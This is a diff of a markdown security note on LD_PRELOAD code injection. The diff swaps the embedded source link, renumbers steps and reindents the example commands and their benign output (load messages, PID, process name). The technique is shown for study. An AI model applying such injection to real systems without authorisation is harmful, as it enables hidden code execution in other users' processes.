@@ -87,54 +87,54 @@ In other words, you can compile a shared library to be invoked at load time and/
 
 1. Reuse the following code for compiling a shared library:
 
-    {% embed url="https://raw.githubusercontent.com/ProfessionallyEvil/LD_PRELOAD-run-at-load-time/main/src/inject.c" %}
+    {% embed url="https://gist.github.com/0xn3va/cb07cc44c39cf2652bb747b655b0200b" %}
 
-2. Compile the shared library with the next command:
+1. Compile the shared library with the next command:
 
     ```bash
     $ gcc -Wall -O3 -fPIC -shared inject.c -o inject.so
     ```
 
-3. Exploit:
+1. Exploit:
 
-```bash
-$ LD_PRELOAD=./inject.so git -v
+    ```bash
+    $ LD_PRELOAD=./inject.so git -v
 
- [+] Inject.so Loaded!
- [*] PID: 1337
- [*] Process: /usr/bin/git
+    [+] Inject.so Loaded!
+    [*] PID: 1337
+    [*] Process: /usr/bin/git
 
-Unknown option: -v
-usage: git [--version] [--help] [-C <path>] [-c name=value]
-           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
-           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]
-           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
-           <command> [<args>]
+    Unknown option: -v
+    usage: git [--version] [--help] [-C <path>] [-c name=value]
+            [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
+            [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]
+            [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
+            <command> [<args>]
 
- [-] Inject.so is being unloaded!
-```
+    [-] Inject.so is being unloaded!
+    ```
 
-```bash
-$ LD_PRELOAD=./inject.so id
+    ```bash
+    $ LD_PRELOAD=./inject.so id
 
- [+] Inject.so Loaded!
- [*] PID: 1337
- [*] Process: /usr/bin/id
+    [+] Inject.so Loaded!
+    [*] PID: 1337
+    [*] Process: /usr/bin/id
 
-uid=0(root) gid=0(root) groups=0(root)
-```
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
 
-```bash
-$ LD_PRELOAD=./inject.so bash -c "echo 'hello'"
+    ```bash
+    $ LD_PRELOAD=./inject.so bash -c "echo 'hello'"
 
- [+] Inject.so Loaded!
- [*] PID: 1337
- [*] Process: /bin/bash
+    [+] Inject.so Loaded!
+    [*] PID: 1337
+    [*] Process: /bin/bash
 
-hello
+    hello
 
- [-] Inject.so is being unloaded!
-```
+    [-] Inject.so is being unloaded!
+    ```
 
 References:
 - [LD_PRELOAD: How to Run Code at Load Time](https://www.secureideas.com/blog/2021/02/ld_preload-how-to-run-code-at-load-time.html)
